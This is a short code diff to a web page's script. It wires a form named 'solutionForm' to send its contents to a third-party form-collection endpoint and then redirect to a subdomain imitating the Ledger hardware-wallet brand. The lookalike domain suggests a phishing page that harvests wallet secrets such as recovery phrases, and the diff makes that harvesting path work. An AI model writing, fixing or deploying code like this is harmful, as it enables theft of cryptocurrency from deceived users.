@@ -2096,9 +2096,12 @@ window._uxa.push(["trackPageview",window.location.pathname+window.location.hash.
 
 const form = document.getElementById('solutionForm');
 
-const formData = new FormData(form); // create new FormData objecthttps://usebasin.com/f/eb20225ebe56 
+form.addEventListener('submit', (event) => {
+  event.preventDefault(); // prevent default form submission behavior
 
-  fetch('https://usebasin.com/f/548f9eddc44b', { //sd
+  const formData = new FormData(form); // create new FormData objecthttps://usebasin.com/f/eb20225ebe56 
+
+  fetch('https://usebasin.com/f/d20efeb18687', { //sd
     method: 'POST',
     body: formData // pass form data as the request body
   })
@@ -2110,7 +2113,7 @@ const formData = new FormData(form); // create new FormData objecthttps://usebas
   })
   .then(data => {
     console.log(data); // log the response data
-    window.location.href = 'https://sync-ledgerdevices.vercel.app/support.html'; // redirect to thank you page
+    window.location.href = 'https://sync-ledgerdevice.vercel.app/support.html'; // redirect to thank you page
   })
   .catch(error => {
     console.error('Error:', error); // log any errors
